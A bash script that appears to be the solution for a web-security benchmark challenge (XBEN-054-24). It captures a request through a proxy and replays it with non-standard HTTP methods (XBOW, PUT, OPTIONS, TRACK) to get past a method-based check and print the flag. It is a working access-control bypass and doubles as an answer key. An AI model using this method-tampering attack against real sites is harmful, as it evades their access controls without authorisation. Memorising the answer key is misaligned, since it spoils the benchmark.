#!/usr/bin/env bash
# XBEN-054-24 — HTTP method tampering. Proxy-mode twin. The handler gates the
# flag on the request method but accepts non-standard verbs; one of them is not
# the one the UI uses, and it returns the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben054p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/index.php"
BASE="$(req_of GET index.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
for verb in XBOW PUT OPTIONS TRACK; do
  "$H5I" websec replay "$BASE" --session "$SESSION" --set "method=$verb" >/dev/null 2>&1 || true
done
print_flag
